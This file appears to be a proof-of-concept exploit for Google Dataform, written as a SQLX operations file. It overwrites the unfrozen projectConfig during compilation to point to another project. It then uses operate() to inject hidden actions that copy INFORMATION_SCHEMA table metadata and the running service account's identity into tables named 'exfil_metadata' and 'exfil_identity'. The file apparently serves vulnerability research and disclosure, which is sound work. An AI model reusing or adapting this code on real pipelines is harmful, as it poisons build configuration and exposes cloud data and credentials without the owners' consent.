config { type: "operations", name: "aaa_operate_exploit" }

js {
  // =============================================================================
  // EXPLOIT: Configuration Pollution + Dynamic Action Creation
  // =============================================================================
  //
  // This file demonstrates that:
  // 1. dataform.projectConfig is NOT frozen
  // 2. We can modify it during compilation
  // 3. We can call operate() to create a NEW action
  // 4. The new action will be included in the compilation output
  // 5. When the workflow is EXECUTED, our malicious SQL runs in BigQuery
  //
  // =============================================================================

  let exploitLog = {
    timestamp: new Date().toISOString(),
    phase: "compilation",
    vulnerability: "projectConfig not frozen"
  };

  // Record original config
  exploitLog.originalConfig = {
    defaultDatabase: dataform.projectConfig.defaultDatabase,
    defaultSchema: dataform.projectConfig.defaultSchema
  };

  // Step 1: Poison the config (this affects all subsequent actions)
  dataform.projectConfig.defaultDatabase = "shir-research-3";
  dataform.projectConfig.defaultSchema = "dataform_poc";

  exploitLog.poisonedConfig = {
    defaultDatabase: dataform.projectConfig.defaultDatabase,
    defaultSchema: dataform.projectConfig.defaultSchema
  };

  // Step 2: Create a malicious operation using operate()
  // This operation will execute SQL that:
  // - Queries INFORMATION_SCHEMA to enumerate all tables in the project
  // - Creates a new table with the exfiltrated metadata
  //
  // When the workflow is executed, this SQL runs with the service account's permissions

  try {
    operate("exfil_metadata")
      .queries([
        `-- Exploit: Exfiltrate INFORMATION_SCHEMA metadata
         -- This query runs when the workflow is executed
         CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.exfil_metadata\` AS
         SELECT
           table_catalog as project_id,
           table_schema as dataset_id,
           table_name,
           table_type,
           creation_time,
           CAST(row_count AS INT64) as row_count,
           CAST(size_bytes AS INT64) as size_bytes
         FROM \`shir-research-3.region-us.INFORMATION_SCHEMA.TABLES\`
         WHERE table_schema NOT LIKE 'INFORMATION_SCHEMA%'
         ORDER BY size_bytes DESC
         LIMIT 1000`
      ]);
    exploitLog.operateSuccess = true;
    exploitLog.operateName = "exfil_metadata";
  } catch(e) {
    exploitLog.operateError = e.message;
  }

  // Step 3: Also create an operation that gets the service account identity
  try {
    operate("exfil_identity")
      .queries([
        `-- Exploit: Capture the service account identity
         CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.exfil_identity\` AS
         SELECT
           SESSION_USER() as service_account,
           CURRENT_TIMESTAMP() as captured_at,
           @@project_id as current_project`
      ]);
    exploitLog.identityOperateSuccess = true;
  } catch(e) {
    exploitLog.identityOperateError = e.message;
  }

  // Log the exploit status
  exploitLog.status = "EXPLOIT_COMPILED";
  exploitLog.nextStep = "Execute workflow invocation to run SQL in BigQuery";
}

-- This is just a placeholder query for the main action
-- The real exploit is in the operate() calls above
SELECT '${JSON.stringify(exploitLog)}' as exploit_status
